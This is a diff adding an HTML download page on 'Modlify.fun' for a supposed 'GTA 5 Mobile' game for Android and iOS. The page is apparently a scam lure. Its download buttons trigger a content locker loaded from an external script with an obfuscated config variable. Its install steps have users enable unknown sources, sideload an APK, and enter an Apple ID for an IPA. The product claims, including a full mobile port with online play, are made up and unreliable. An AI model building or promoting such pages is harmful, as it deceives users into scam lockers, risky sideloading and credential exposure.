@@ -1,0 +1,211 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Download GTA 5 Mobile - Experience the full Grand Theft Auto V experience on your smartphone. Get it now on Android and iOS.">
+    <meta name="keywords" content="GTA 5 Mobile, modded games, mobile games, modlify.fun, download games">
+    <meta property="og:title" content="GTA 5 Mobile - Modlify.fun">
+    <meta property="og:description" content="Download the latest modded version of GTA 5 Mobile.
+Explore the vast open world of Los Santos on your smartphone.">
+    <meta property="og:image" content="https://i.ibb.co/nsqFbZYX/5ea17-15973837610273-800-2025-02-24-T200151-466.jpg">
+    <meta property="og:url" content="https://www.modlify.fun/gta5-mobile">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="GTA 5 Mobile - Modlify.fun">
+    <meta name="twitter:description" content="Download the latest modded version of GTA 5 Mobile.
+Explore the vast open world of Los Santos on your smartphone.">
+    <meta name="twitter:image" content="https://i.ibb.co/nsqFbZYX/5ea17-15973837610273-800-2025-02-24-T200151-466.jpg">
+    <meta name="author" content="Modlify.fun">
+    <link rel="icon" href="https://i.ibb.co/gbsY945Q/Black-and-Green-Illustrative-E-Sports-Gaming-Logo-2-removebg.png">
+    <title>GTA 5 Mobile - Modlify.fun</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="header">
+        <nav class="nav-container">
+            <a href="https://www.apkdix.blogspot.com" class="back-icon">
+                <i class="fas fa-arrow-left"></i> Back to Home
+            </a>
+            <div class="menu-icon" id="menuIcon">
+             
+<i class="fas fa-bars"></i>
+            </div>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="#">Home</a></li>
+                <li><a href="#">Popular Apps</a></li>
+                <li><a href="#">New Releases</a></li>
+                
+<li><a href="#">Categories</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="hero">
+        <img src="img/postergta.jpg" alt="GTA 5 Mobile Cover">
+    </div>
+
+    <div class="container">
+        <div class="game-info">
+            <img src="img/gta5.jpg" alt="GTA 5 Mobile Logo" class="game-icon">
+      
+<div class="game-details">
+                <h1>GTA 5 Mobile</h1>
+                <small>For Android and iOS</small>
+            </div>
+        </div>
+
+        <div class="download-section">
+            <button onclick="showContentLocker('android')" class="download-btn">
+  
+<i class="fab fa-android"></i> Download for Android
+            </button>
+            <button onclick="showContentLocker('ios')" class="download-btn">
+                <i class="fab fa-apple"></i> Download for iOS
+            </button>
+        </div>
+
+        <div class="specs-grid">
+            <div class="spec-item">
+                <h3>Size</h3>
+                <p>1.2GB (Installer) 8GB (Post-Download Cache)</p>
+            </div>
+            <div class="spec-item">
+                <h3>Price</h3>
+    
+<p>Free</p>
+            </div>
+            <div class="spec-item">
+                <h3>Android Compatible</h3>
+                <p>Qualcomm Snapdragon 845 and better, 4GB RAM</p>
+            </div>
+            
+<div class="spec-item">
+                <h3>iOS Devices Required</h3>
+                <p>iPhone XS Max or newer, iPad Pro 2018 or later</p>
+            </div>
+        </div>
+
+        <div class="installation">
+            <h2>Installation Guide</h2>
+   
+<div class="install-tabs">
+                <div class="install-tab active" onclick="changeInstallTab(0)">Android</div>
+                <div class="install-tab" onclick="changeInstallTab(1)">iOS</div>
+            </div>
+            <div class="install-content">
+                <ul class="install-steps" id="android-steps">
+          
+<li>Download the APK file using the Android download button above</li>
+                    <li>Go to Settings > Security > Enable "Unknown Sources"</li>
+                    <li>Locate the downloaded APK file in your file manager</li>
+                    <li>Tap to install and follow 
+on-screen instructions</li>
+                    <li>After installation, download the additional game cache files</li>
+                    <li>Place cache files in Android/obb/ folder</li>
+                    <li>Launch the game and enjoy!</li>
+                </ul>
+       
+<ul class="install-steps" id="ios-steps" style="display:none">
+                    <li>Download the IPA file using the iOS download button</li>
+                    <li>Install AltStore on your computer (Windows/Mac required)</li>
+                    <li>Connect your iOS device and open AltStore</li>
+        
+<li>Select "Install .ipa" and choose the downloaded file</li>
+                    <li>Enter your Apple ID when prompted</li>
+                    <li>Trust the developer in Settings > General > Device Management</li>
+                    <li>Launch the game and download additional resources</li>
+ 
+</ul>
+            </div>
+        </div>
+
+        <div class="features">
+            <h2>Features</h2>
+            <ul class="feature-list">
+                <li>Full Open World: Explore 
+all of Los Santos and Blaine County</li>
+                <li>Enhanced Graphics: Mobile-optimized visuals with HD textures</li>
+                <li>Complete Story Mode: All original missions and characters</li>
+                <li>Multiplayer Support: Online mode with friends</li>
+                <li>Controller Support: Play with Bluetooth controllers</li>
+       
+</ul>
+        </div>
+
+        <div class="screenshots">
+            <h2>Screenshots</h2>
+            <div class="screenshot-grid">
+                <img src="img/gta6.jpg" alt="GTA 5 Mobile Screenshot 1" class="screenshot">
+                <img src="img/gta4.jpg" alt="GTA 
+5 Mobile Screenshot 2" class="screenshot">
+                <img src="img/gta52.jpg" alt="GTA 5 Mobile Screenshot 3" class="screenshot">
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-grid">
+            <div class="footer-section">
+               
+<h3>About Us</h3>
+                <ul class="footer-links">
+                    <li><a href="#">Our Mission</a></li>
+                    <li><a href="#">Team</a></li>
+                    <li><a href="#">Careers</a></li>
+                 
+<li><a href="#">Contact Us</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Quick Links</h3>
+                <ul class="footer-links">
+                    
+<li><a href="#">Home</a></li>
+                    <li><a href="#">Popular Apps</a></li>
+                    <li><a href="#">New Releases</a></li>
+                    <li><a href="#">Categories</a></li>
+                </ul>
+            </div>
+      
+<div class="footer-section">
+                <h3>Legal</h3>
+                <ul class="footer-links">
+                    <li><a href="#">Privacy Policy</a></li>
+                    <li><a href="#">Terms of Service</a></li>
+               
+<li><a href="#">Disclaimer</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Follow Us</h3>
+                <div class="social-links">
+                   
+<a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
+                    <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
+                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+                </div>
+       
+</div>
+        </div>
+        <div class="footer-bottom">
+            ©
+2025 <a href="#">Modlify.fun</a>. All rights reserved. | Designed by <a href="https://www.youtube.com/@Modlify-Games" target="_blank">Modlify Games</a>
+        </div>
+    </footer>
+
+    <script type="text/javascript">
+    var PByBs_MQe_KenuJc={"it":4487209,"key":":f8989"};
+</script>
+<script src="https://d2v7l2267atlz5.cloudfront.net/115281f.js"></script>
+   
+     
+    <script src="main.js"></script>
+</body>
+</html>
